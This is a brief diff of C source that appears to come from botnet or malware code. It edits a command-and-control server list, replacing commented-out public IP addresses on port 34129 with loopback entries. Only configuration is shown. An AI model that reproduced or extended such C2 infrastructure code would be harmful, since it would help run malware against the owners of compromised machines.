@@ -63,9 +63,9 @@ static int tcp_failures = 0;
 static char id_buf[32];
 
 struct cnc_addr CNC_LIST[] = {
+    {INET_ADDR(127,0,0,1), NP_HTONS(34129)},
+    {INET_ADDR(127,0,0,1), NP_HTONS(34129)},
     {INET_ADDR(127,0,0,1), NP_HTONS(34129)}
-    //{INET_ADDR(198,157,13,55), NP_HTONS(34129)},
-    //{INET_ADDR(198,157,13,51), NP_HTONS(34129)},
 };
 
 static struct handshake_ctx g_hs_ctx;
